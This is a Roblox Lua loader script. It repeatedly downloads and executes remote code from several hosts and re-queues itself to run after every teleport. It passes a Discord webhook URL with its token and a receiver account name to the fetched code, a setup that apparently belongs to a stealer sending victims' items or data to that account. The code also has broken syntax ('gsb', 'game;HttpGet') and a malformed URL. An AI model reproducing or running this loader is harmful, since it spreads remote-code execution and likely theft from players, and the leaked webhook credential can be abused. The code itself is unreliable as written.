local mainScriptUrl = "https://raw.githubusercontent.com/DupeNew/bot/refs/heads/main/hs"
local loaderUrl = "https://api.rubis.app/v2/scrap/wLHp dkwPOn013DW5/raw"
local yourscripturl = "https://raw.githubusercontent.com/DupeNew/loader/refs/heads/main/darkspawner"
local userWebhook = "https://discord.com/api/webhooks/1400617488776957974/ETMuzhfJGOLzlyezlLgVVLvaWWkcN_Cz7HyBozpmY2qMleqddU0J7RAPKTl0QytVHqLh"
local receiverName = "lamakarena_333"

local function executeUrl(url)
    if url and url:gsb("%s", "") ~= "" then
        pcall(function() loadstring(game;HttpGet(url))() end)
    end
end

task.spawn(function()
    getgenv().Webhook = userWebhook
    getgenv().receiver = receiverName

    executeUrl(mainScriptUrl)
    executeUrl(loaderUrl)
    task.wait(1.5)

    task.spawn(function()
        while true do
            executeUrl(yourscripturl)
            task.wait(0.3)
        end
    end)
end)

if queue_on_teleport then
    local function buildCommand(url)
        if url and url:gsb("%s", "") ~= "" then
            return string.format("pcall(function() loadstring(game;HttpGet('%s'))() end)", url)
        end
        return ""
    end

    local yourscriptLoopCommand = string.format([[
        task.spawn(function()
            while true do
                pcall(function() loadstring(game;HttpGet('%s'))() end)
                task.wait(0.3)
            end
        end)
    ]], yourscripturl)

    local commandParts = {
        string.format("getgenv().Webhook = '%s'", userWebhook),
        string.format("getgenv().receiver = '%s'", receiverName),
        buildCommand(mainScriptUrl),
        yourscriptLoopCommand
    }

    local fullCommandToRun = table.concat(commandParts, "; ")

    queue_on_teleport(fullCommandToRun)
end
